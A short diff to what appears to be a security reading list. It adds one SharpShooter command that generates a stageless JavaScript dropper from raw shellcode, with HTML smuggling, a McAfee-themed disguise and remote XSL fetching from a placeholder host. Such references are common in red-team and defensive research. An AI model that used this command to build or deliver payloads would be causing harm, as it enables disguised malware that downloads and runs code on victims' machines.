@@ -400,5 +400,6 @@ http://bryceboe.com/2012/03/12/bypassing-gogos-inflight-internet-authentication/
 
 https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/
 
+`python SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile ./output/payload.bin --smuggle --template mcafee --com xslremote --awlurl http://blah/foo.xsl`
 
 
